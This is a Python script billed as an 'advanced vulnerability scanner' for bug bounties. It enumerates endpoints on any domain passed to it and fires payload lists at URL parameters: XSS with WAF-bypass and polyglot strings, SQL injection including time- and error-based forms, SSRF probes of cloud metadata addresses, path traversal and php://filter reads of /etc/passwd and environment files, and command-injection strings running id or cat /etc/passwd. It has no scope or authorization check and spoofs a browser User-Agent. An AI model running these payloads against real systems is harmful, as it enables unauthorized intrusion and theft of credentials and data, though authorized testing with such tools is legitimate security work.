#!/usr/bin/env python3
"""
ADVANCED VULNERABILITY SCANNER - REAL BUG BOUNTY TOOL
Professional-grade vulnerability discovery with advanced techniques
"""
import os
import sys
import time
import json
import requests
import socket
import threading
import concurrent.futures
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
import re
import base64
import hashlib
import random
import string
from datetime import datetime

class AdvancedVulnerabilityScanner:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.vulnerabilities = []
        self.endpoints = set()
        
    def advanced_xss_scanner(self, url):
        """Advanced XSS detection with multiple techniques"""
        print(f"[*] Advanced XSS scanning: {url}")
        
        # Advanced XSS payloads
        xss_payloads = [
            # Basic XSS
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            
            # WAF bypass payloads
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
            "<svg onload=alert(String.fromCharCode(88,83,83))>",
            
            # Filter bypass
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<img src=x onerror=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            
            # Event handlers
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            
            # DOM-based XSS
            "javascript:alert('XSS')",
            "vbscript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            
            # Polyglot payloads
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>",
            "<script>/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>",
            
            # Advanced filter bypass
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
            "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>",
        ]
        
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        for param_name, param_values in query_params.items():
            for payload in xss_payloads:
                try:
                    # Test reflected XSS
                    test_url = url.replace(f"{param_name}={param_values[0]}", f"{param_name}={payload}")
                    response = self.session.get(test_url, timeout=10)
                    
                    if payload in response.text:
                        self.vulnerabilities.append({
                            'type': 'Reflected XSS',
                            'severity': 'High',
                            'url': test_url,
                            'payload': payload,
                            'parameter': param_name,
                            'description': f'Reflected XSS found in parameter {param_name}'
                        })
                        print(f"[!] XSS found: {test_url}")
                        return True
                        
                except Exception as e:
                    continue
                    
        return False
    
    def advanced_sql_injection_scanner(self, url):
        """Advanced SQL injection detection"""
        print(f"[*] Advanced SQL injection scanning: {url}")
        
        # Advanced SQL payloads
        sql_payloads = [
            # Basic SQLi
            "' OR 1=1--",
            "\" OR 1=1--",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            
            # Union-based
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            
            # Boolean-based
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            
            # Time-based
            "'; WAITFOR DELAY '00:00:05'--",
            "'; SELECT SLEEP(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            
            # Error-based
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(0x7e,0x27,0x7e,0x27)) FROM information_schema.tables LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            
            # WAF bypass
            "'/**/OR/**/1=1--",
            "'/**/UNION/**/SELECT/**/NULL--",
            "'/**/AND/**/(SELECT/**/COUNT(*)/**/FROM/**/information_schema.tables)>0--",
            
            # Advanced techniques
            "' OR 1=1 LIMIT 1--",
            "' OR 1=1 ORDER BY 1--",
            "' OR 1=1 GROUP BY 1--",
            "' OR 1=1 HAVING 1=1--",
        ]
        
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        for param_name, param_values in query_params.items():
            for payload in sql_payloads:
                try:
                    test_url = url.replace(f"{param_name}={param_values[0]}", f"{param_name}={payload}")
                    response = self.session.get(test_url, timeout=10)
                    
                    # Check for SQL error messages
                    sql_errors = [
                        "SQL syntax", "mysql_fetch_array()", "ORA-", "syntax error",
                        "unclosed quotation mark", "quoted string not properly terminated",
                        "Microsoft OLE DB Provider", "ODBC SQL Server Driver",
                        "PostgreSQL query failed", "Warning: mysql_",
                        "MySQLSyntaxErrorException", "valid MySQL result",
                        "MySqlClient.MySqlException", "SQLite3::SQLException",
                        "sqlite3.OperationalError", "sqlite3.ProgrammingError"
                    ]
                    
                    if any(error in response.text for error in sql_errors):
                        self.vulnerabilities.append({
                            'type': 'SQL Injection',
                            'severity': 'Critical',
                            'url': test_url,
                            'payload': payload,
                            'parameter': param_name,
                            'description': f'SQL injection found in parameter {param_name}'
                        })
                        print(f"[!] SQLi found: {test_url}")
                        return True
                        
                except Exception as e:
                    continue
                    
        return False
    
    def advanced_ssrf_scanner(self, url):
        """Advanced SSRF detection"""
        print(f"[*] Advanced SSRF scanning: {url}")
        
        # SSRF payloads
        ssrf_payloads = [
            "http://localhost:80",
            "http://127.0.0.1:80",
            "http://0.0.0.0:80",
            "http://[::1]:80",
            "http://localhost:22",
            "http://127.0.0.1:22",
            "http://localhost:3306",
            "http://127.0.0.1:3306",
            "http://localhost:5432",
            "http://127.0.0.1:5432",
            "http://localhost:6379",
            "http://127.0.0.1:6379",
            "http://localhost:9200",
            "http://127.0.0.1:9200",
            "http://169.254.169.254/",
            "http://metadata.google.internal/",
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "file:///etc/passwd",
            "file:///etc/hosts",
            "file:///proc/version",
            "file:///proc/self/environ",
            "gopher://127.0.0.1:22/",
            "dict://127.0.0.1:22/",
            "ldap://127.0.0.1:389/",
        ]
        
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        for param_name, param_values in query_params.items():
            for payload in ssrf_payloads:
                try:
                    test_url = url.replace(f"{param_name}={param_values[0]}", f"{param_name}={payload}")
                    response = self.session.get(test_url, timeout=5)
                    
                    # Check for SSRF indicators
                    ssrf_indicators = [
                        "Connection refused", "Connection timed out",
                        "No route to host", "Network is unreachable",
                        "root:x:", "localhost", "127.0.0.1",
                        "Linux version", "Darwin Kernel",
                        "Microsoft Windows", "FreeBSD",
                        "instance-id", "ami-id", "hostname",
                        "public-ipv4", "local-ipv4"
                    ]
                    
                    if any(indicator in response.text for indicator in ssrf_indicators):
                        self.vulnerabilities.append({
                            'type': 'Server-Side Request Forgery (SSRF)',
                            'severity': 'High',
                            'url': test_url,
                            'payload': payload,
                            'parameter': param_name,
                            'description': f'SSRF found in parameter {param_name}'
                        })
                        print(f"[!] SSRF found: {test_url}")
                        return True
                        
                except Exception as e:
                    continue
                    
        return False
    
    def advanced_lfi_scanner(self, url):
        """Advanced Local File Inclusion detection"""
        print(f"[*] Advanced LFI scanning: {url}")
        
        # LFI payloads
        lfi_payloads = [
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "....//....//....//etc/passwd",
            "....\\....\\....\\windows\\win.ini",
            "php://filter/read=convert.base64-encode/resource=../../../etc/passwd",
            "php://filter/read=convert.base64-encode/resource=../../../../etc/passwd",
            "php://filter/read=convert.base64-encode/resource=../../../../../etc/passwd",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
            "expect://id",
            "file:///etc/passwd",
            "file:///etc/hosts",
            "file:///proc/version",
            "file:///proc/self/environ",
        ]
        
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        for param_name, param_values in query_params.items():
            for payload in lfi_payloads:
                try:
                    test_url = url.replace(f"{param_name}={param_values[0]}", f"{param_name}={payload}")
                    response = self.session.get(test_url, timeout=10)
                    
                    # Check for LFI indicators
                    lfi_indicators = [
                        "root:x:", "daemon:x:", "bin:x:", "sys:x:",
                        "[fonts]", "[extensions]", "[mci extensions]",
                        "Linux version", "Darwin Kernel", "FreeBSD",
                        "PATH=", "HOME=", "USER=", "SHELL=",
                        "HTTP_USER_AGENT=", "HTTP_REFERER=",
                        "uid=", "gid=", "groups="
                    ]
                    
                    if any(indicator in response.text for indicator in lfi_indicators):
                        self.vulnerabilities.append({
                            'type': 'Local File Inclusion (LFI)',
                            'severity': 'High',
                            'url': test_url,
                            'payload': payload,
                            'parameter': param_name,
                            'description': f'LFI found in parameter {param_name}'
                        })
                        print(f"[!] LFI found: {test_url}")
                        return True
                        
                except Exception as e:
                    continue
                    
        return False
    
    def advanced_rce_scanner(self, url):
        """Advanced Remote Code Execution detection"""
        print(f"[*] Advanced RCE scanning: {url}")
        
        # RCE payloads
        rce_payloads = [
            # Basic command injection
            "; id",
            "| id",
            "& id",
            "` id`",
            "$(id)",
            "`whoami`",
            "$(whoami)",
            "; whoami",
            "| whoami",
            "& whoami",
            
            # Advanced command injection
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "& cat /etc/passwd",
            "` cat /etc/passwd`",
            "$(cat /etc/passwd)",
            "; ls -la",
            "| ls -la",
            "& ls -la",
            "` ls -la`",
            "$(ls -la)",
            
            # Windows command injection
            "; dir",
            "| dir",
            "& dir",
            "` dir`",
            "$(dir)",
            "; type C:\\windows\\win.ini",
            "| type C:\\windows\\win.ini",
            "& type C:\\windows\\win.ini",
            "` type C:\\windows\\win.ini`",
            "$(type C:\\windows\\win.ini)",
            
            # PHP code injection
            "; phpinfo();",
            "| phpinfo();",
            "& phpinfo();",
            "` phpinfo();`",
            "$(phpinfo();)",
            "; system('id');",
            "| system('id');",
            "& system('id');",
            "` system('id');`",
            "$(system('id');)",
            
            # Python code injection
            "; __import__('os').system('id')",
            "| __import__('os').system('id')",
            "& __import__('os').system('id')",
            "` __import__('os').system('id')`",
            "$(__import__('os').system('id'))",
        ]
        
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        for param_name, param_values in query_params.items():
            for payload in rce_payloads:
                try:
                    test_url = url.replace(f"{param_name}={param_values[0]}", f"{param_name}={payload}")
                    response = self.session.get(test_url, timeout=10)
                    
                    # Check for RCE indicators
                    rce_indicators = [
                        "uid=", "gid=", "groups=", "root:x:", "daemon:x:",
                        "Directory of", "Volume in drive", "Volume Serial Number",
                        "phpinfo()", "PHP Version", "System", "Build Date",
                        "Server API", "Virtual Directory Support",
                        "Configuration File (php.ini) Path",
                        "Loaded Configuration File",
                        "Scan this dir for additional .ini files",
                        "Additional .ini files parsed",
                        "PHP API", "PHP Extension", "Zend Extension",
                        "Thread Safety", "Zend Memory Manager",
                        "Zend Multibyte Support", "IPv6 Support",
                        "Registered PHP Streams", "Registered Stream Filters",
                        "This program makes use of the Zend Scripting Language Engine",
                    ]
                    
                    if any(indicator in response.text for indicator in rce_indicators):
                        self.vulnerabilities.append({
                            'type': 'Remote Code Execution (RCE)',
                            'severity': 'Critical',
                            'url': test_url,
                            'payload': payload,
                            'parameter': param_name,
                            'description': f'RCE found in parameter {param_name}'
                        })
                        print(f"[!] RCE found: {test_url}")
                        return True
                        
                except Exception as e:
                    continue
                    
        return False
    
    def discover_endpoints(self, base_url):
        """Discover endpoints using multiple techniques"""
        print(f"[*] Discovering endpoints for {base_url}")
        
        # Common endpoints
        common_endpoints = [
            "/", "/admin", "/login", "/register", "/dashboard", "/api",
            "/api/v1", "/api/v2", "/api/v3", "/api/docs", "/api/swagger",
            "/swagger", "/swagger-ui", "/swagger-ui.html", "/docs",
            "/graphql", "/graphiql", "/playground", "/console",
            "/phpmyadmin", "/adminer", "/pma", "/mysql", "/sql",
            "/backup", "/backups", "/backup.sql", "/db.sql", "/database.sql",
            "/config", "/configuration", "/settings", "/setup", "/install",
            "/test", "/debug", "/dev", "/development", "/staging",
            "/.env", "/.git", "/.svn", "/.hg", "/.bzr",
            "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
            "/security.txt", "/.well-known/security.txt",
            "/.well-known/apple-app-site-association",
            "/.well-known/assetlinks.json",
            "/wp-admin", "/wp-login.php", "/wp-content",
            "/administrator", "/admin.php", "/admin.html",
            "/user", "/users", "/profile", "/account",
            "/search", "/search.php", "/search.html",
            "/contact", "/about", "/help", "/support",
            "/faq", "/terms", "/privacy", "/legal",
            "/status", "/health", "/ping", "/version",
            "/info", "/phpinfo", "/phpinfo.php",
            "/test.php", "/test.html", "/test.txt",
            "/upload", "/uploads", "/files", "/download",
            "/static", "/assets", "/css", "/js", "/images",
            "/img", "/pics", "/photos", "/media",
            "/tmp", "/temp", "/cache", "/logs",
            "/var", "/var/www", "/var/log", "/var/tmp",
            "/etc", "/etc/passwd", "/etc/hosts", "/etc/shadow",
            "/proc", "/proc/version", "/proc/self/environ",
            "/sys", "/sys/class", "/sys/devices",
            "/dev", "/dev/null", "/dev/zero", "/dev/random",
            "/bin", "/sbin", "/usr", "/usr/bin", "/usr/sbin",
            "/home", "/root", "/opt", "/mnt", "/media",
        ]
        
        for endpoint in common_endpoints:
            try:
                full_url = urljoin(base_url, endpoint)
                response = self.session.get(full_url, timeout=5)
                
                if response.status_code == 200:
                    self.endpoints.add(full_url)
                    print(f"[+] Found endpoint: {full_url}")
                    
            except Exception as e:
                continue
    
    def run_advanced_scan(self):
        """Run advanced vulnerability scan"""
        print(f"[*] Starting advanced vulnerability scan for {self.target}")
        
        # Phase 1: Endpoint Discovery
        print("\n[1/3] Discovering endpoints...")
        self.discover_endpoints(f"https://{self.target}")
        print(f"[+] Found {len(self.endpoints)} endpoints")
        
        # Phase 2: Advanced Vulnerability Testing
        print("\n[2/3] Testing for advanced vulnerabilities...")
        for endpoint in list(self.endpoints)[:20]:  # Limit for efficiency
            print(f"[*] Testing endpoint: {endpoint}")
            
            # Test all vulnerability types
            self.advanced_xss_scanner(endpoint)
            self.advanced_sql_injection_scanner(endpoint)
            self.advanced_ssrf_scanner(endpoint)
            self.advanced_lfi_scanner(endpoint)
            self.advanced_rce_scanner(endpoint)
        
        # Phase 3: Generate Report
        print("\n[3/3] Generating advanced report...")
        self.generate_advanced_report()
        
        print(f"\n[+] Advanced scan completed! Found {len(self.vulnerabilities)} vulnerabilities")
        return self.vulnerabilities
    
    def generate_advanced_report(self):
        """Generate advanced vulnerability report"""
        report_data = {
            "target": self.target,
            "timestamp": datetime.now().isoformat(),
            "endpoints_tested": len(self.endpoints),
            "vulnerabilities_found": len(self.vulnerabilities),
            "vulnerabilities": self.vulnerabilities,
            "summary": {
                "critical": len([v for v in self.vulnerabilities if v['severity'] == 'Critical']),
                "high": len([v for v in self.vulnerabilities if v['severity'] == 'High']),
                "medium": len([v for v in self.vulnerabilities if v['severity'] == 'Medium']),
                "low": len([v for v in self.vulnerabilities if v['severity'] == 'Low'])
            }
        }
        
        # Save report
        os.makedirs("logs/advanced_scans", exist_ok=True)
        report_filename = f"logs/advanced_scans/advanced_scan_{self.target.replace('.', '_')}_{int(time.time())}.json"
        with open(report_filename, 'w') as f:
            json.dump(report_data, f, indent=4)
        print(f"[+] Advanced report saved to: {report_filename}")
        
        # Print summary
        print("\n" + "="*60)
        print("ADVANCED VULNERABILITY SCAN SUMMARY")
        print("="*60)
        print(f"Target: {self.target}")
        print(f"Endpoints tested: {len(self.endpoints)}")
        print(f"Vulnerabilities found: {len(self.vulnerabilities)}")
        print(f"Critical: {report_data['summary']['critical']}")
        print(f"High: {report_data['summary']['high']}")
        print(f"Medium: {report_data['summary']['medium']}")
        print(f"Low: {report_data['summary']['low']}")
        print("="*60)
        
        if self.vulnerabilities:
            print("\nVULNERABILITIES FOUND:")
            for vuln in self.vulnerabilities:
                print(f"  [{vuln['severity']}] {vuln['type']}: {vuln['url']}")
                print(f"    Parameter: {vuln.get('parameter', 'N/A')}")
                print(f"    Payload: {vuln['payload']}")
                print(f"    Description: {vuln['description']}")
                print()

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 advanced_vulnerability_scanner.py <target_domain>")
        sys.exit(1)
    
    target = sys.argv[1]
    scanner = AdvancedVulnerabilityScanner(target)
    scanner.run_advanced_scan()
